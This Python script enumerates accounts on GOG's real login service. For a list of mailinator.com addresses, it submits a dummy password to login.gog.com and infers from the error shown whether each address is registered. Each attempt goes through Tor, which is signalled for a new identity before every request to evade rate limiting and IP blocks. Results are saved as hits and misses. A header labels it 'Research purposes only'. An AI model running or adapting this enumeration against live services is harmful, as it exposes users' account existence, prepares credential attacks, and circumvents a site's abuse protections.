import asyncio
import code
import json
import os
import socket

import tqdm
from aiohttp import ClientSession
from aiohttp_socks import ProxyConnector
from bs4 import BeautifulSoup

from ddd.utils import DIR_DATA



def reset_tor_ip():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect(('127.0.0.1', 9051))
        sock.sendall(b'AUTHENTICATE ""\n')
        sock.sendall(b'SIGNAL NEWNYM\n')
        sock.recv(1024).decode('utf-8')


async def check_account(addr):
    reset_tor_ip()

    connector = ProxyConnector.from_url('socks5://127.0.0.1:9050')
    headers = {
        'User-Agent': 'x',
        'Message': 'Research purposes only, will reach out later.',
    }
    async with ClientSession(headers=headers, connector=connector) as sess:
        sess.cookie_jar.update_cookies({'csrf': 'true'})

        res = await sess.get(r'https://login.gog.com/auth?client_id=46755278331571209')
        html = BeautifulSoup(await res.text(), 'html.parser')
        login_token = html.find(id='login__token').get('value')
        
        res = await sess.post('https://login.gog.com/login_check', data={
            'login[username]': addr,    
            'login[password]': 'supersecret',    
            'login[login_flow]': 'default',
            'login[_token]': login_token,
        })
        html = BeautifulSoup(await res.text(), 'html.parser')

        if html.find(id='error_login_password').parent.select('.field__msg:not(.is-hidden)'):
            return True
        if html.find(id='error_login_username').parent.select('.field__msg:not(.is-hidden)'):
            return False

        raise RuntimeError('Something went wrong.')



def load_addresses():
    with open(os.path.join(DIR_DATA, 'addresses.txt')) as f:
        return [f'{addr}@mailinator.com' for addr in f.read().strip().split('\n')]



async def main():
    addresses = load_addresses()
    data = {addr: None for addr in addresses}

    for addr in tqdm.tqdm(addresses):
        try:
            try:
                if await check_account(addr):
                    tqdm.tqdm.write(f'{addr}: \033[92mHIT\033[0m')
                    data[addr] = True
                else:
                    tqdm.tqdm.write(f'{addr}: \033[91mMISS\033[0m')
                    data[addr] = False
            except Exception as e:
                tqdm.tqdm.write(f'Error: {e}')
            finally:
                await asyncio.sleep(2)
        except asyncio.CancelledError:
            code.interact(local=locals()|globals())

    try:
        with open('gog_results.json', 'w') as f:
            json.dump(data, f, indent=4)
    except:
        code.interact(local=locals()|globals())


if __name__ == '__main__':
    asyncio.run(main())
